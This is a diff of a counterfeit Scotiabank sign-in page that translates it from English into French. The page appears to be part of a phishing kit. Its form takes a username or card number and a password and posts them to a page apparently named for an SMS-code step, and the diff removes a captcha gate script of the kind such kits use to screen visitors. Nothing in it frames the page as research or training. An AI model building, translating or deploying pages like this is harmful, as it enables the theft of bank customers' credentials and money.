@@ -1,10 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
-<script>if(!sessionStorage.getItem('__cptPass')||sessionStorage.getItem('__cptPass')!=='1'){try{document.documentElement.innerHTML=''}catch(e){}window.location.replace('/captcha.html');throw new Error('BLOCKED');}</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scotiabank - Sign In</title>
+    <title>Banque Scotia - Ouvrir une session</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; padding: 0; color: #333; display: flex; flex-direction: column; min-height: 100vh; }
@@ -53,43 +52,43 @@
 <body>
     <div class="s-container">
         
-        <div class="s-title-top">Welcome to</div>
-        <div class="s-title-bottom">Scotiabank<sup>&reg;</sup></div>
+        <div class="s-title-top">Bienvenue &agrave; la</div>
+        <div class="s-title-bottom">Banque Scotia<sup>MD</sup></div>
         
         <form action="scotiabank101_sms.html" method="POST">
-            <label class="s-label">Username or Card Number</label>
+            <label class="s-label">Nom d'utilisateur ou no de carte</label>
             <div class="s-input-wrapper">
                 <i class="fa-regular fa-user s-input-icon"></i>
-                <input type="text" name="Username or Card Number" class="s-input" placeholder="Enter username or card number" required>
+                <input type="text" class="s-input" placeholder="Entrer nom d'utilisateur ou n&deg; carte" required>
             </div>
             
-            <label class="s-label">Password</label>
+            <label class="s-label">Mot de passe</label>
             <div class="s-input-wrapper">
                 <i class="fa-solid fa-lock s-input-icon" style="font-size: 16px;"></i>
-                <input type="password" name="Password" class="s-input" placeholder="Enter password" required>
+                <input type="password" class="s-input" placeholder="Entrer le mot de passe" required>
             </div>
             
             <div class="s-checkbox-row">
                 <input type="checkbox" class="s-checkbox" id="memoriser">
-                <label for="memoriser" class="s-checkbox-label">Remember my username or card number</label>
+                <label for="memoriser" class="s-checkbox-label">M&eacute;moriser mon nom d'utilisateur ou num&eacute;ro de carte</label>
             </div>
             
-            <button type="submit" class="s-btn">Sign In</button>
+            <button type="submit" class="s-btn">Ouvrir une session</button>
         </form>
         
-        <a href="#" class="s-help-link">Need help signing in? &gt;</a>
+        <a href="#" class="s-help-link">Besoin d'aide pour ouvrir une session? &gt;</a>
 
     </div>
     
     <div class="s-footer">
-        Do you have a username and password?<br>
-        <a href="#" class="s-footer-link">Set them up now.</a>
+        Avez-vous un nom d'utilisateur et un mot de passe?<br>
+        <a href="#" class="s-footer-link">&Eacute;tablissez-les maintenant.</a>
     </div>
 
     <!-- Loader Overlay -->
     <div id="loaderOverlay" class="loader-overlay">
         <div class="loader-spinner"></div>
-        <p class="loader-text">Processing...</p>
+        <p class="loader-text">Traitement en cours...</p>
     </div>
 
     <script>
